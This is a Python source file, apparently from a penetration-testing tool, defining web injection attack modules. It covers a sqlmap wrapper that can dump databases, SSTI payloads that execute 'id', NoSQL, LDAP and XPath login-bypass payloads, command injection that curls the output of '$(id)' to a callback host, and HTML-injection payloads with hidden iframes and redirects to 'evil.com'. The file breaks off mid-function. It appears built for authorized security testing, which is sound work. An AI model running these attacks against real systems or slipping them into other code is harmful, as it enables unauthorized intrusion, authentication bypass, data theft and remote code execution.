"""
Injection attack modules — auto-discovered by ModuleRegistry.
Sprint 2 Phase 1 subset: SQL Injection + SSTI
"""
from __future__ import annotations
from apps.modules.engine import BaseModule, FieldSchema
from apps.modules.runner import ToolRunner


# ─── [I-01] SQL Injection ─────────────────────────────────────────────────────

class SQLInjectionModule(BaseModule):
    id = "I-01"
    name = "SQL Injection"
    category = "injection"
    description = (
        "SQLMap wrapper with full technique control, DB type selection, "
        "auth configuration, and extraction goals."
    )
    risk_level = "critical"
    tags = ["sqli", "sqlmap", "database", "injection"]
    celery_queue = "web_audit_queue"
    time_limit = 900

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target URL",
            field_type="url",
            required=True,
            placeholder="https://example.com/products?id=1",
            help_text="Include the vulnerable parameter in the URL.",
        ),
        FieldSchema(
            key="injection_point",
            label="Injection Point",
            field_type="radio",
            default="get_param",
            options=[
                {"value": "get_param",  "label": "GET Parameter"},
                {"value": "post_body",  "label": "POST Body"},
                {"value": "header",     "label": "HTTP Header"},
                {"value": "cookie",     "label": "Cookie"},
            ],
        ),
        FieldSchema(
            key="parameter",
            label="Parameter Name",
            field_type="text",
            required=False,
            placeholder="id",
            help_text="Leave empty to test all params.",
        ),
        FieldSchema(
            key="techniques",
            label="Injection Techniques",
            field_type="checkbox_group",
            default=["B", "T", "E"],
            options=[
                {"value": "B", "label": "Boolean-based blind"},
                {"value": "E", "label": "Error-based"},
                {"value": "U", "label": "UNION-based"},
                {"value": "S", "label": "Stacked queries"},
                {"value": "T", "label": "Time-based blind"},
            ],
        ),
        FieldSchema(
            key="db_type",
            label="Database Type",
            field_type="radio",
            default="auto",
            options=[
                {"value": "auto",       "label": "Auto-detect"},
                {"value": "MySQL",      "label": "MySQL"},
                {"value": "PostgreSQL", "label": "PostgreSQL"},
                {"value": "MsSQL",      "label": "MSSQL"},
                {"value": "Oracle",     "label": "Oracle"},
                {"value": "SQLite",     "label": "SQLite"},
            ],
        ),
        FieldSchema(
            key="extraction_goal",
            label="Extraction Goal",
            field_type="radio",
            default="detect",
            options=[
                {"value": "detect", "label": "Detect & confirm only"},
                {"value": "dbs",    "label": "Extract database names"},
                {"value": "tables", "label": "Extract tables"},
                {"value": "dump",   "label": "Dump data (use carefully)"},
            ],
        ),
        FieldSchema(
            key="auth_cookie",
            label="Session Cookie",
            field_type="text",
            required=False,
            sensitive=True,
            placeholder="session=abc123; csrf=xyz",
            group="advanced",
        ),
        FieldSchema(
            key="level",
            label="Test Level (1–5)",
            field_type="range_slider",
            default=1,
            min_value=1,
            max_value=5,
            step=1,
            group="advanced",
            help_text="Higher = more tests, slower, more noise.",
        ),
        FieldSchema(
            key="risk",
            label="Risk Level (1–3)",
            field_type="range_slider",
            default=1,
            min_value=1,
            max_value=3,
            step=1,
            group="advanced",
            help_text="Risk 2-3 may update/delete data. Use carefully.",
        ),
        FieldSchema(
            key="batch",
            label="Non-interactive (--batch)",
            field_type="toggle",
            default=True,
            group="advanced",
        ),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        runner = ToolRunner("sqlmap")
        url = params["target_url"]
        techniques = "".join(params.get("techniques", ["B", "T", "E"]))

        args = [
            "-u", url,
            "--technique", techniques,
            "--level", str(int(params.get("level", 1))),
            "--risk", str(int(params.get("risk", 1))),
            "--output-dir", str(runner.output_file_path(job_id, "dir").parent),
        ]

        if params.get("batch"):
            args.append("--batch")
        if params.get("parameter"):
            args += ["-p", params["parameter"]]
        if params.get("auth_cookie"):
            args += ["--cookie", params["auth_cookie"]]
        if params.get("db_type") and params["db_type"] != "auto":
            args += ["--dbms", params["db_type"]]

        goal = params.get("extraction_goal", "detect")
        if goal == "dbs":
            args.append("--dbs")
        elif goal == "tables":
            args.append("--tables")
        elif goal == "dump":
            args.append("--dump")

        stream("info", f"Running sqlmap against {url}...")
        result = runner.run(args=args, stream=stream, timeout=self.time_limit)

        findings = []
        if "is vulnerable" in result.get("stdout", "").lower() or "injection" in result.get("stdout", "").lower():
            findings.append({
                "title": f"SQL Injection detected at {url}",
                "severity": "critical",
                "url": url,
                "description": "SQLMap confirmed SQL injection vulnerability. Check raw output for details.",
                "evidence": result.get("stdout", "")[:2000],
                "remediation": (
                    "Use parameterized queries / prepared statements. "
                    "Never interpolate user input into SQL strings."
                ),
            })

        return {
            "status": "done" if result["returncode"] in (0, 1) else "failed",
            "findings": findings,
            "raw_output": result.get("stdout", ""),
        }


# ─── [I-06] SSTI — Server-Side Template Injection ────────────────────────────

class SSTIModule(BaseModule):
    id = "I-06"
    name = "SSTI — Template Injection"
    category = "injection"
    description = (
        "Detect and exploit server-side template injection in Jinja2, Twig, "
        "Freemarker, ERB, Velocity, and others."
    )
    risk_level = "critical"
    tags = ["ssti", "template-injection", "rce", "jinja2", "twig"]
    celery_queue = "web_audit_queue"
    time_limit = 300

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target URL",
            field_type="url",
            required=True,
            placeholder="https://example.com/render?template=",
            help_text="URL with a parameter that renders user input via a template engine.",
        ),
        FieldSchema(
            key="parameter",
            label="Injection Parameter",
            field_type="text",
            required=True,
            placeholder="template",
        ),
        FieldSchema(
            key="method",
            label="HTTP Method",
            field_type="select",
            default="GET",
            options=[
                {"value": "GET",  "label": "GET"},
                {"value": "POST", "label": "POST"},
            ],
        ),
        FieldSchema(
            key="post_data",
            label="POST Body Template",
            field_type="text",
            required=False,
            placeholder="name={{payload}}&other=value",
            show_if={"method": "POST"},
            help_text="Use {{payload}} as placeholder for injection point.",
        ),
        FieldSchema(
            key="auth_header",
            label="Authorization Header",
            field_type="text",
            required=False,
            sensitive=True,
            placeholder="Bearer eyJhbGci...",
            group="advanced",
        ),
        FieldSchema(
            key="try_rce",
            label="Attempt RCE chain (id / whoami)",
            field_type="toggle",
            default=False,
            group="advanced",
            help_text="Only enable in authorized environments.",
        ),
    ]

    # Probes: (payload, engine_hint, severity)
    _PROBES = [
        ("{{7*7}}", "Jinja2 / Twig",       "critical"),
        ("${7*7}",  "FreeMarker / EL",      "critical"),
        ("#{7*7}",  "Thymeleaf / Spring",   "critical"),
        ("<%=7*7%>","ERB",                  "critical"),
        ("<%= 7*7%>","ERB alternate",       "critical"),
        ("{{7*'7'}}", "Jinja2 string repeat", "critical"),
        ("*{7*7}",  "Spring SpEL",          "critical"),
    ]

    _RCE_PAYLOADS = {
        "Jinja2":  "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "Twig":    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "FreeMarker": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
    }

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import urllib.parse
        import urllib.request

        url = params["target_url"]
        param = params["parameter"]
        method = params.get("method", "GET")
        findings = []

        headers = {"User-Agent": "PenTools/1.0"}
        if params.get("auth_header"):
            headers["Authorization"] = params["auth_header"]

        for payload, engine_hint, severity in self._PROBES:
            try:
                expected = "49"  # 7*7
                if method == "GET":
                    encoded = urllib.parse.quote(payload)
                    probe_url = f"{url}&{param}={encoded}" if "?" in url else f"{url}?{param}={encoded}"
                    req = urllib.request.Request(probe_url, headers=headers)
                    with urllib.request.urlopen(req, timeout=10) as resp:
                        body = resp.read().decode("utf-8", errors="replace")
                else:
                    post_template = params.get("post_data", f"{param}={{{{payload}}}}")
                    post_body = post_template.replace("{{payload}}", urllib.parse.quote(payload))
                    data = post_body.encode()
                    req = urllib.request.Request(url, data=data, headers={**headers, "Content-Type": "application/x-www-form-urlencoded"})
                    with urllib.request.urlopen(req, timeout=10) as resp:
                        body = resp.read().decode("utf-8", errors="replace")

                if expected in body:
                    stream("error", f"SSTI DETECTED! Payload: {payload} → hint: {engine_hint}")
                    findings.append({
                        "title": f"Server-Side Template Injection ({engine_hint})",
                        "severity": severity,
                        "url": url,
                        "description": (
                            f"The parameter '{param}' reflects template execution output. "
                            f"Probe '{payload}' returned '{expected}'. Engine hint: {engine_hint}."
                        ),
                        "evidence": f"Payload: {payload}\nResponse snippet: {body[:500]}",
                        "remediation": (
                            "Never pass user input directly to template render calls. "
                            "Use a sandbox environment or sanitize input strictly."
                        ),
                    })
                else:
                    stream("info", f"No reflection for: {payload}")
            except Exception as e:
                stream("warning", f"Request failed for payload {payload}: {e}")

        return {
            "status": "done",
            "findings": findings,
            "raw_output": f"Tested {len(self._PROBES)} SSTI probes against {url}",
        }


# ─── [I-02] NoSQL Injection ───────────────────────────────────────────────────

class NoSQLInjectionModule(BaseModule):
    id = "I-02"
    name = "NoSQL Injection"
    category = "injection"
    description = (
        "Test MongoDB and CouchDB endpoints for NoSQL operator injection ($ne, $gt, $regex, $where). "
        "Detects auth bypass and data extraction via operator manipulation."
    )
    risk_level = "critical"
    tags = ["nosql", "mongodb", "couchdb", "injection", "auth-bypass"]
    celery_queue = "web_audit_queue"
    time_limit = 300

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target URL",
            field_type="url",
            required=True,
            placeholder="https://api.example.com/api/login",
        ),
        FieldSchema(
            key="method",
            label="HTTP Method",
            field_type="select",
            default="POST",
            options=[
                {"value": "POST", "label": "POST"},
                {"value": "GET",  "label": "GET"},
                {"value": "PUT",  "label": "PUT"},
            ],
        ),
        FieldSchema(
            key="content_type",
            label="Content Type",
            field_type="select",
            default="json",
            options=[
                {"value": "json", "label": "application/json"},
                {"value": "form", "label": "application/x-www-form-urlencoded"},
            ],
        ),
        FieldSchema(
            key="username_field",
            label="Username Field Name",
            field_type="text",
            default="username",
            placeholder="username",
        ),
        FieldSchema(
            key="password_field",
            label="Password Field Name",
            field_type="text",
            default="password",
            placeholder="password",
        ),
        FieldSchema(
            key="normal_username",
            label="Valid Username (for baseline)",
            field_type="text",
            required=False,
            placeholder="admin",
            help_text="Used to establish a baseline response for comparison.",
        ),
        FieldSchema(
            key="attack_types",
            label="Attack Types",
            field_type="checkbox_group",
            default=["ne_bypass", "regex", "gt_bypass", "where"],
            options=[
                {"value": "ne_bypass", "label": "$ne bypass (password not-equal)"},
                {"value": "regex",     "label": "$regex match (wildcard username)"},
                {"value": "gt_bypass", "label": "$gt bypass (greater-than empty)"},
                {"value": "where",     "label": "$where JavaScript injection"},
            ],
        ),
        FieldSchema(
            key="auth_cookie",
            label="Session Cookie (existing session)",
            field_type="text",
            required=False,
            sensitive=True,
            placeholder="session=abc123",
            group="advanced",
        ),
        FieldSchema(
            key="verify_tls",
            label="Verify TLS",
            field_type="toggle",
            default=True,
        ),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests
        import urllib3

        urllib3.disable_warnings()
        verify = params.get("verify_tls", True)
        url = params["target_url"]
        method = params.get("method", "POST")
        ct = params.get("content_type", "json")
        ufield = params.get("username_field", "username")
        pfield = params.get("password_field", "password")
        attacks = params.get("attack_types", ["ne_bypass", "regex"])
        findings = []

        headers: dict[str, str] = {"User-Agent": "PenTools/NoSQLi"}
        if params.get("auth_cookie"):
            headers["Cookie"] = params["auth_cookie"]

        # Baseline request
        baseline_len = None
        normal_user = params.get("normal_username", "admin")
        try:
            if ct == "json":
                br = requests.request(
                    method, url,
                    json={ufield: normal_user, pfield: "wrongpassword_baseline"},
                    headers=headers, timeout=12, verify=verify,
                )
            else:
                br = requests.request(
                    method, url,
                    data={ufield: normal_user, pfield: "wrongpassword_baseline"},
                    headers=headers, timeout=12, verify=verify,
                )
            baseline_len = len(br.text)
            stream("info", f"Baseline response: HTTP {br.status_code}, {baseline_len} bytes")
        except Exception as e:
            stream("warning", f"Baseline request failed: {e}")

        payloads: list[tuple[str, dict]] = []
        if "ne_bypass" in attacks:
            payloads.append(("$ne bypass", {ufield: normal_user, pfield: {"$ne": ""}}))
            payloads.append(("$ne bypass (both)", {ufield: {"$ne": ""}, pfield: {"$ne": ""}}))
        if "regex" in attacks:
            payloads.append(("$regex match", {ufield: {"$regex": ".*"}, pfield: {"$ne": ""}}))
        if "gt_bypass" in attacks:
            payloads.append(("$gt bypass", {ufield: normal_user, pfield: {"$gt": ""}}))
        if "where" in attacks:
            payloads.append(("$where inject", {ufield: {"$where": "1==1"}, pfield: {"$ne": ""}}))

        for label, body_data in payloads:
            try:
                if ct == "json":
                    resp = requests.request(
                        method, url, json=body_data,
                        headers=headers, timeout=12, verify=verify,
                    )
                else:
                    # For form encoding, operators become array params
                    flat: dict[str, str] = {}
                    for k, v in body_data.items():
                        if isinstance(v, dict):
                            for op, val in v.items():
                                flat[f"{k}[{op}]"] = str(val)
                        else:
                            flat[k] = str(v)
                    resp = requests.request(
                        method, url, data=flat,
                        headers=headers, timeout=12, verify=verify,
                    )

                stream("info", f"{label}: HTTP {resp.status_code}, {len(resp.text)} bytes")

                # Heuristic: auth bypass if 200/302, or significantly different from baseline
                is_bypass = (
                    resp.status_code in (200, 302)
                    and baseline_len is not None
                    and abs(len(resp.text) - baseline_len) > 100
                ) or (
                    resp.status_code == 200
                    and any(kw in resp.text.lower() for kw in ("token", "dashboard", "welcome", "logout", "success"))
                )

                if is_bypass:
                    stream("success", f"NoSQL Injection bypass confirmed: {label}")
                    findings.append({
                        "title": f"NoSQL Injection — {label}",
                        "severity": "critical",
                        "url": url,
                        "description": (
                            f"NoSQL operator injection ({label}) appears to bypass authentication. "
                            f"The server returned HTTP {resp.status_code} with a response indicative of success."
                        ),
                        "evidence": f"Payload: {body_data}\nHTTP {resp.status_code}\nResponse snippet: {resp.text[:400]}",
                        "remediation": (
                            "Sanitize and type-check all incoming JSON before using as database query operators. "
                            "Use parameterized queries or ORM layer that does not allow raw operator injection."
                        ),
                        "cwe_id": "CWE-943",
                    })

            except Exception as e:
                stream("warning", f"Request failed for {label}: {e}")

        stream("info", f"NoSQL injection scan complete — {len(findings)} findings")
        return {"status": "done", "findings": findings}


# ─── [I-03] LDAP Injection ────────────────────────────────────────────────────

class LDAPInjectionModule(BaseModule):
    id = "I-03"
    name = "LDAP Injection"
    category = "injection"
    description = (
        "Test login forms and search endpoints for LDAP injection — "
        "authentication bypass via wildcard and OR-injection payloads."
    )
    risk_level = "high"
    tags = ["ldap", "injection", "auth-bypass", "owasp-a03"]
    celery_queue = "web_audit_queue"
    time_limit = 180

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target URL",
            field_type="url",
            required=True,
            placeholder="https://example.com/login",
        ),
        FieldSchema(
            key="method",
            label="Method",
            field_type="select",
            default="POST",
            options=[
                {"value": "POST", "label": "POST"},
                {"value": "GET",  "label": "GET"},
            ],
        ),
        FieldSchema(
            key="username_field",
            label="Username Field",
            field_type="text",
            default="username",
        ),
        FieldSchema(
            key="password_field",
            label="Password Field",
            field_type="text",
            default="password",
        ),
        FieldSchema(
            key="normal_username",
            label="Known Username (for baseline)",
            field_type="text",
            required=False,
            placeholder="admin",
        ),
        FieldSchema(
            key="verify_tls",
            label="Verify TLS",
            field_type="toggle",
            default=True,
        ),
    ]

    _BYPASS_PAYLOADS = [
        ("Wildcard",              "*",           "wrongpassword"),
        ("OR-True username",      "*)(uid=*))(|(uid=*", "wrongpassword"),
        ("Comment bypass",        "admin)(&))",  "wrongpassword"),
        ("Wildcard password",     "admin",       "*"),
        ("Both wildcard",         "*",           "*"),
        ("Null byte",             "admin\x00",   "wrongpassword"),
        ("Boolean TRUE",          "*)(|(objectClass=*))",  "wrongpassword"),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests
        import urllib3

        urllib3.disable_warnings()
        verify = params.get("verify_tls", True)
        url = params["target_url"]
        method = params.get("method", "POST")
        ufield = params.get("username_field", "username")
        pfield = params.get("password_field", "password")
        findings = []

        headers = {"User-Agent": "PenTools/LDAPi"}

        # Baseline
        try:
            baseline_resp = requests.request(
                method, url,
                data={ufield: "admin", pfield: "wrongpassword_baseline"},
                headers=headers, timeout=12, verify=verify,
            )
            baseline_len = len(baseline_resp.text)
            baseline_status = baseline_resp.status_code
            stream("info", f"Baseline: HTTP {baseline_status}, {baseline_len} bytes")
        except Exception as e:
            stream("warning", f"Baseline failed: {e}")
            baseline_len = None
            baseline_status = None

        for label, uval, pval in self._BYPASS_PAYLOADS:
            try:
                resp = requests.request(
                    method, url,
                    data={ufield: uval, pfield: pval},
                    headers=headers, timeout=12, verify=verify,
                )
                stream("info", f"{label}: HTTP {resp.status_code}, {len(resp.text)} bytes")

                is_bypass = (
                    resp.status_code == 200
                    and baseline_status != 200
                ) or (
                    baseline_len is not None
                    and abs(len(resp.text) - baseline_len) > 80
                    and resp.status_code in (200, 302)
                    and any(w in resp.text.lower() for w in ("welcome", "dashboard", "logout", "success", "token"))
                )

                if is_bypass:
                    stream("success", f"LDAP injection bypass likely: {label}")
                    findings.append({
                        "title": f"LDAP Injection — {label}",
                        "severity": "high",
                        "url": url,
                        "description": (
                            f"LDAP injection payload '{label}' produced a response consistent "
                            f"with authentication bypass. Server returned HTTP {resp.status_code}."
                        ),
                        "evidence": f"User: {uval!r}  Pass: {pval!r}\nHTTP {resp.status_code}\n{resp.text[:300]}",
                        "remediation": (
                            "Escape all special LDAP characters in user input: ( ) * \\ NUL. "
                            "Use a well-tested LDAP library that parameterizes filters."
                        ),
                        "cwe_id": "CWE-90",
                    })
            except Exception as e:
                stream("warning", f"Request failed for {label}: {e}")

        stream("info", f"LDAP injection scan complete — {len(findings)} findings")
        return {"status": "done", "findings": findings}


# ─── [I-04] XPath Injection ───────────────────────────────────────────────────

class XPathInjectionModule(BaseModule):
    id = "I-04"
    name = "XPath Injection"
    category = "injection"
    description = (
        "Test endpoints backed by XPath queries for blind and error-based injection. "
        "Detects auth bypass and data extraction via XPath boolean payloads."
    )
    risk_level = "high"
    tags = ["xpath", "injection", "xml", "auth-bypass"]
    celery_queue = "web_audit_queue"
    time_limit = 180

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target URL",
            field_type="url",
            required=True,
            placeholder="https://example.com/login",
        ),
        FieldSchema(
            key="method",
            label="Method",
            field_type="select",
            default="POST",
            options=[{"value": "POST", "label": "POST"}, {"value": "GET", "label": "GET"}],
        ),
        FieldSchema(
            key="username_field",
            label="Username Field",
            field_type="text",
            default="username",
        ),
        FieldSchema(
            key="password_field",
            label="Password Field",
            field_type="text",
            default="password",
        ),
        FieldSchema(
            key="attack_types",
            label="XPath Attack Types",
            field_type="checkbox_group",
            default=["auth_bypass", "blind_boolean", "error_based"],
            options=[
                {"value": "auth_bypass",   "label": "Authentication bypass"},
                {"value": "blind_boolean", "label": "Blind boolean-based"},
                {"value": "error_based",   "label": "Error-based extraction"},
            ],
        ),
        FieldSchema(
            key="verify_tls",
            label="Verify TLS",
            field_type="toggle",
            default=True,
        ),
    ]

    _PAYLOADS = {
        "auth_bypass": [
            ("OR True",          "' or '1'='1",           "wrongpassword"),
            ("OR 1=1",           "' or 1=1 or ''='",       "wrongpassword"),
            ("Comment out pass", "admin'",                 "' or '1'='1"),
            ("XPath axes",       "' or name()='root' or '", "wrongpassword"),
        ],
        "blind_boolean": [
            ("Boolean probe 1",  "' and 1=1 and '1'='1", "wrongpassword"),
            ("Boolean probe 2",  "' and 1=2 and '1'='1", "wrongpassword"),
        ],
        "error_based": [
            ("Syntax error",     "'\"",                    "wrongpassword"),
            ("Unclosed bracket", "' and (((",               "wrongpassword"),
        ],
    }

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests
        import urllib3

        urllib3.disable_warnings()
        verify = params.get("verify_tls", True)
        url = params["target_url"]
        method = params.get("method", "POST")
        ufield = params.get("username_field", "username")
        pfield = params.get("password_field", "password")
        attacks = params.get("attack_types", ["auth_bypass"])
        findings = []

        headers = {"User-Agent": "PenTools/XPathi"}

        # Baseline
        try:
            br = requests.request(method, url, data={ufield: "admin", pfield: "wrongpassword_baseline"},
                                  headers=headers, timeout=12, verify=verify)
            baseline_status, baseline_len = br.status_code, len(br.text)
            stream("info", f"Baseline: HTTP {baseline_status}, {baseline_len} bytes")
        except Exception:
            baseline_status, baseline_len = None, None

        _error_keywords = ("xpath", "xmldb", "org.apache.xpath", "javax.xml.xpath",
                           "invalid expression", "undefined function", "unterminated string")

        for attack in attacks:
            for label, uval, pval in self._PAYLOADS.get(attack, []):
                try:
                    resp = requests.request(method, url, data={ufield: uval, pfield: pval},
                                            headers=headers, timeout=12, verify=verify)
                    body_lower = resp.text.lower()
                    stream("info", f"{label}: HTTP {resp.status_code}")

                    has_error = any(e in body_lower for e in _error_keywords)
                    is_bypass = (resp.status_code == 200 and baseline_status != 200) or (
                        baseline_len and abs(len(resp.text) - baseline_len) > 80
                        and resp.status_code in (200, 302)
                    )

                    if has_error:
                        findings.append({
                            "title": f"XPath Injection — Error-based ({label})",
                            "severity": "high",
                            "url": url,
                            "description": f"XPath-related error message in response for payload '{uval}'.  Indicates XPath query construction from user input.",
                            "evidence": f"Payload: {uval!r}\nError keywords found in response: {resp.text[:400]}",
                            "remediation": "Use parameterized XPath queries or an XML library that separates data from query structure.",
                            "cwe_id": "CWE-91",
                        })
                    elif is_bypass:
                        findings.append({
                            "title": f"XPath Injection — Auth Bypass ({label})",
                            "severity": "high",
                            "url": url,
                            "description": f"XPath boolean payload appears to bypass login for '{uval}'.",
                            "evidence": f"Payload: {uval!r}  HTTP {resp.status_code}\n{resp.text[:300]}",
                            "remediation": "Parameterize XPath expressions and never concatenate user input.",
                            "cwe_id": "CWE-91",
                        })
                except Exception as e:
                    stream("warning", f"Request failed ({label}): {e}")

        stream("info", f"XPath injection scan complete — {len(findings)} findings")
        return {"status": "done", "findings": findings}


# ─── [I-05] Command Injection ─────────────────────────────────────────────────

class CommandInjectionModule(BaseModule):
    id = "I-05"
    name = "Command Injection"
    category = "injection"
    description = (
        "Test GET/POST parameters for OS command injection using chaining operators. "
        "Supports time-based blind detection and OOB (ping/curl to interactsh callback)."
    )
    risk_level = "critical"
    tags = ["command-injection", "rce", "os-inject", "oob", "oast"]
    celery_queue = "web_audit_queue"
    time_limit = 240

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target URL",
            field_type="url",
            required=True,
            placeholder="https://example.com/utils/ping?host=example.com",
        ),
        FieldSchema(
            key="method",
            label="Method",
            field_type="select",
            default="GET",
            options=[{"value": "GET", "label": "GET"}, {"value": "POST", "label": "POST"}],
        ),
        FieldSchema(
            key="parameter",
            label="Vulnerable Parameter",
            field_type="text",
            required=True,
            placeholder="host",
        ),
        FieldSchema(
            key="attack_types",
            label="Detection Techniques",
            field_type="checkbox_group",
            default=["in_band", "time_based"],
            options=[
                {"value": "in_band",    "label": "In-band (command output in response)"},
                {"value": "time_based", "label": "Time-based blind (sleep)"},
                {"value": "oob",        "label": "OOB / OAST (curl to callback)"},
            ],
        ),
        FieldSchema(
            key="oast_domain",
            label="OAST Callback Domain (for OOB)",
            field_type="text",
            required=False,
            placeholder="xxxx.oast.fun",
            oast_callback=True,
            show_if={"attack_types": "oob"},
        ),
        FieldSchema(
            key="auth_cookie",
            label="Session Cookie",
            field_type="text",
            required=False,
            sensitive=True,
            placeholder="session=abc123",
        ),
        FieldSchema(
            key="verify_tls",
            label="Verify TLS",
            field_type="toggle",
            default=True,
        ),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests
        import urllib3
        import time

        urllib3.disable_warnings()
        verify = params.get("verify_tls", True)
        url = params["target_url"]
        method = params.get("method", "GET")
        param = params["parameter"]
        attacks = params.get("attack_types", ["in_band", "time_based"])
        oast = params.get("oast_domain", "").strip()
        findings = []

        headers = {"User-Agent": "PenTools/CMDi"}
        if params.get("auth_cookie"):
            headers["Cookie"] = params["auth_cookie"]

        import urllib.parse
        parsed = urllib.parse.urlparse(url)
        existing_qs = dict(urllib.parse.parse_qsl(parsed.query))

        def send(p: str):
            if method == "GET":
                qs = {**existing_qs, param: p}
                test_url = urllib.parse.urlunparse(
                    parsed._replace(query=urllib.parse.urlencode(qs))
                )
                return requests.get(test_url, headers=headers, timeout=18, verify=verify)
            else:
                return requests.post(url, data={param: p}, headers=headers, timeout=18, verify=verify)

        _OUTPUT_KEYWORDS = ("root:", "uid=", "win32", "system32", "linux", "/etc/passwd", "daemon:")

        if "in_band" in attacks:
            in_band_payloads = [
                ("; id",       "Shell ; operator"),
                ("| id",       "Shell | pipe"),
                ("|| id",      "Shell || OR"),
                ("$(id)",      "Shell $() subshell"),
                ("`id`",       "Shell backtick"),
                ("\n id",      "Newline injection"),
                ("; whoami",   "whoami ; operator"),
                ("& whoami &", "Windows & operator"),
            ]
            for payload, label in in_band_payloads:
                try:
                    resp = send(payload)
                    if any(kw in resp.text for kw in _OUTPUT_KEYWORDS):
                        stream("success", f"Command injection confirmed (in-band): {label}")
                        findings.append({
                            "title": f"Command Injection — In-Band ({label})",
                            "severity": "critical",
                            "url": url,
                            "description": f"OS command output was returned in the HTTP response. Payload: '{payload}'",
                            "evidence": f"Param: {param}\nPayload: {payload}\nResponse: {resp.text[:500]}",
                            "remediation": "Never pass user input to OS commands. Whitelist allowed values. Use subprocess with fixed args list.",
                            "cwe_id": "CWE-78",
                        })
                        break
                    stream("info", f"In-band {label}: HTTP {resp.status_code}")
                except Exception as e:
                    stream("warning", f"In-band request failed: {e}")

        if "time_based" in attacks:
            sleep_payloads = [
                ("; sleep 5",         "Unix sleep ; "),
                ("| sleep 5",         "Unix sleep | "),
                ("$(sleep 5)",        "Unix sleep $()"),
                ("& ping -n 6 127.0.0.1 &", "Windows ping delay"),
            ]
            for payload, label in sleep_payloads:
                try:
                    t0 = time.time()
                    resp = send(payload)
                    elapsed = time.time() - t0
                    stream("info", f"Time-based {label}: {elapsed:.1f}s (HTTP {resp.status_code})")
                    if elapsed >= 4.5:
                        stream("success", f"Time-based command injection: {elapsed:.1f}s delay detected!")
                        findings.append({
                            "title": f"Command Injection — Time-Based Blind ({label})",
                            "severity": "critical",
                            "url": url,
                            "description": f"Response delayed by {elapsed:.1f}s after sleep payload. Confirms command injection.",
                            "evidence": f"Param: {param}\nPayload: '{payload}'\nResponse time: {elapsed:.2f}s",
                            "remediation": "Never pass user input to OS commands. Whitelist allowed values.",
                            "cwe_id": "CWE-78",
                        })
                        break
                except Exception as e:
                    stream("warning", f"Time-based request failed: {e}")

        if "oob" in attacks and oast:
            oob_payloads = [
                f"; curl http://{oast}/cmdi-$(id)",
                f"| curl http://{oast}/cmdi-$(whoami)",
                f"`curl http://{oast}/cmdi-$(id)`",
                f"; nslookup {oast}",
                f"; ping -c 1 {oast}",
            ]
            stream("info", f"Sending OOB payloads to callback: {oast}")
            for payload in oob_payloads:
                try:
                    resp = send(payload)
                    stream("info", f"OOB payload sent: HTTP {resp.status_code}")
                except Exception as e:
                    stream("warning", f"OOB send failed: {e}")

            findings.append({
                "title": "Command Injection — OOB Payloads Sent",
                "severity": "info",
                "url": url,
                "description": f"OOB command injection payloads were sent. Monitor {oast} for incoming DNS/HTTP callbacks.",
                "evidence": f"Callback: {oast}\nParam: {param}",
                "remediation": "Never pass user input to OS commands.",
                "cwe_id": "CWE-78",
            })

        stream("info", f"Command injection scan complete — {len(findings)} findings")
        return {"status": "done", "findings": findings}


# ─── [I-07] HTML Injection ────────────────────────────────────────────────────

class HTMLInjectionModule(BaseModule):
    id = "I-07"
    name = "HTML Injection"
    category = "injection"
    description = (
        "Detect HTML injection in reflected parameters — form element injection, "
        "meta refresh redirect, pixel tracking, and iframe embedding."
    )
    risk_level = "medium"
    tags = ["html-injection", "form-injection", "meta-redirect", "owasp-a03"]
    celery_queue = "web_audit_queue"
    time_limit = 120

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target URL",
            field_type="url",
            required=True,
            placeholder="https://example.com/search?q=test",
        ),
        FieldSchema(
            key="method",
            label="Method",
            field_type="select",
            default="GET",
            options=[{"value": "GET", "label": "GET"}, {"value": "POST", "label": "POST"}],
        ),
        FieldSchema(
            key="parameter",
            label="Parameter to Test",
            field_type="text",
            required=True,
            placeholder="q",
        ),
        FieldSchema(
            key="attack_types",
            label="Injection Types",
            field_type="checkbox_group",
            default=["form", "meta_redirect", "iframe", "pixel"],
            options=[
                {"value": "form",          "label": "Form element injection"},
                {"value": "meta_redirect", "label": "Meta refresh redirect"},
                {"value": "iframe",        "label": "IFrame embedding"},
                {"value": "pixel",         "label": "Pixel tracker (1×1 img)"},
            ],
        ),
        FieldSchema(
            key="attacker_domain",
            label="Attacker Domain (for redirect/iframe payloads)",
            field_type="text",
            required=False,
            placeholder="evil.com",
        ),
        FieldSchema(
            key="verify_tls",
            label="Verify TLS",
            field_type="toggle",
            default=True,
        ),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests
        import urllib.parse
        import urllib3

        urllib3.disable_warnings()
        verify = params.get("verify_tls", True)
        url = params["target_url"]
        method = params.get("method", "GET")
        param = params["parameter"]
        attacks = params.get("attack_types", ["form", "meta_redirect"])
        attacker = params.get("attacker_domain", "evil.com")
        findings = []

        headers = {"User-Agent": "PenTools/HTMLi"}
        parsed = urllib.parse.urlparse(url)
        existing_qs = dict(urllib.parse.parse_qsl(parsed.query))

        _PAYLOADS = {
            "form":          f'<form action=https://{attacker}><input type=submit value="Click">',
            "meta_redirect": f'<meta http-equiv="refresh" content="0;url=https://{attacker}">',
            "iframe":        f'<iframe src="https://{attacker}" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%">',
            "pixel":         f'<img src="https://{attacker}/pixel.gif" width=1 height=1>',
        }

        for attack in attacks:
            payload = _PAYLOADS.get(attack, "")
            if not payload:
                continue
            try:
                if method == "GET":
                    qs = {**existing_qs, param: payload}
                    test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(qs)))
                    resp = requests.get(test_url, headers=headers, timeout=12, verify=verify)
                else:
